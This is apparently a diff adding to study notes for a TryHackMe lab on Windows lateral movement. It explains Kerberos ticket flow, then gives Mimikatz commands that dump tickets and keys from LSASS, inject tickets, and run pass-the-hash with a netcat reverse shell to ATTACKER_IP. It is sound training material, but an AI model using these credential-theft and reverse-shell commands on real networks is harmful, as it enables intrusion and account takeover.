@@ -687,3 +687,169 @@ If NTLM authentication is enabled, you can authenticate as a user without knowin
 This is the foundation of Pass‑the‑Hash, a major lateral movement technique in Windows networks.
 
 
+### Kerberos Authentication Overview
+
+Kerberos allows secure authentication on Windows networks using encrypted tickets rather than repeatedly sending passwords.
+
+#### 1. Requesting a Ticket Granting Ticket (TGT)
+
+The client sends its username and a timestamp encrypted with a key derived from its password to the Key Distribution Center (KDC) on the Domain Controller.
+
+If valid, the KDC responds with a Ticket Granting Ticket (TGT) and a Session Key.
+The TGT is encrypted using the krbtgt account’s hash, so the user cannot read it.
+
+ASCII Diagram — Kerberos Get TGT
+```
++-----------+                     +-----------------------+
+|   Client  |                     |  KDC (Domain Ctrlr)   |
++-----------+                     +-----------------------+
+| User Hash |                     | krbtgt Hash | User Hash |
+     |                                      |
+     |----(1) Request TGT------------------->|
+     |   [Username + Timestamp (enc)]        |
+     |<---(2) Response-----------------------|
+     |   [TGT (enc w/ krbtgt hash)]          |
+     |   [Session Key]                       |
+     +---------------------------------------+
+```
+
+#### 2. Requesting a Ticket Granting Service (TGS)
+
+When the user wants to access a network service (e.g., MSSQL, file share, web app), they use the TGT to ask the KDC for a TGS.
+
+The request includes:
+- Username and timestamp (encrypted with the Session Key)
+- The TGT
+- The Service Principal Name (SPN) identifying the target service
+
+The KDC responds with:
+- A TGS (encrypted with the service owner’s hash)
+- A Service Session Key
+
+ASCII Diagram — Kerberos Get TGS
+```
++-----------+                     +-----------------------+
+|   Client  |                     |  KDC (Domain Ctrlr)   |
++-----------+                     +-----------------------+
+| Session Key | TGT |             | krbtgt Hash | Svc Owner Hash |
+     |                                      |
+     |----(3) Request TGS------------------->|
+     |   [Username + Timestamp (enc w/ SessKey)] |
+     |   [TGT] [SPN = MSSQL/SRV]             |
+     |<---(4) Response-----------------------|
+     |   [TGS (enc w/ Svc Owner Hash)]       |
+     |   [Svc Session Key]                   |
+     +---------------------------------------+
+```
+
+#### 3. Authenticating to the Service
+
+The client sends the TGS to the target service.
+The service decrypts it using its own account’s password hash, retrieves the Service Session Key, and validates the connection.
+
+Once verified, the client can access the service securely without ever sending its password again.
+
+ASCII Diagram — Kerberos Authenticate
+```
++-----------+                     +-----------------------+
+|   Client  |                     |     Service Server    |
++-----------+                     +-----------------------+
+| TGS | Svc Session Key |         | Service Owner Hash    |
+     |                                      |
+     |----(5) Send TGS--------------------->|
+     |   [Authenticate using Svc Session Key]|
+     |<---(6) Access Granted----------------|
+     +--------------------------------------+
+```
+
+### Key Takeaways
+
+- Kerberos uses tickets instead of passwords for authentication.
+- The TGT allows requesting service tickets without resending credentials.
+- The TGS is specific to one service and encrypted with that service’s account hash.
+- The Session Keys ensure secure communication between client, KDC, and service.
+
+### Pass‑the‑Ticket (PtT)
+
+Concept:  
+
+Kerberos tickets (TGTs or TGSs) and their session keys can be extracted from LSASS memory using Mimikatz when you have SYSTEM privileges.
+
+Commands:
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+```
+
+Key points:
+- Both the ticket and its session key are required to reuse it.
+- TGTs are most valuable (allow access to any service the user can reach).
+- TGSs are service‑specific and can be extracted by low‑privileged users.
+- Injecting a ticket into your session doesn’t need admin rights:
+
+```
+mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+```
+
+Once injected, tools like klist confirm cached tickets and allow lateral movement.
+```
+za\bob.jenkins@THMJMP2 C:\> klist
+
+Current LogonId is 0:0x1e43562
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ ZA.TRYHACKME.COM
+        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 4/12/2022 0:28:35 (local)
+        End Time:   4/12/2022 10:28:35 (local)
+        Renew Time: 4/23/2022 0:28:35 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: THMDC.za.tryhackme.com
+```
+
+### Overpass‑the‑Hash / Pass‑the‑Key (OPtH / PtK)
+Concept:  
+Kerberos authentication uses encryption keys derived from passwords (DES, RC4, AES128, AES256).
+If you have one of these keys, you can request a TGT without knowing the password.
+
+Commands to extract keys:
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys
+```
+
+Using keys for remote shell (examples):
+- RC4 key (same as NTLM hash):
+```
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+
+AES128 key:
+```
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+
+AES256 key:
+```
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+
+Listener on AttackBox:
+```
+nc -lvp 5556
+```
+
+Notes:
+
+- RC4 = NTLM hash → enables Overpass‑the‑Hash variant.
+- Commands executed from the injected shell use the impersonated Kerberos credentials.
+
+### Summary Table
+Technique	         Protocol	      Required Privilege	    Extracted Material	  Purpose
+Pass‑the‑Ticket	   Kerberos	      SYSTEM (for LSASS dump)	TGT/TGS + Session Key	Reuse valid Kerberos tickets
+Pass‑the‑Key	     Kerberos	      SYSTEM (for LSASS dump)	AES/RC4 key	          Request new TGT without password
+Overpass‑the‑Hash	 Kerberos (RC4)	SYSTEM	                NTLM hash	            Use NTLM hash as Kerberos key
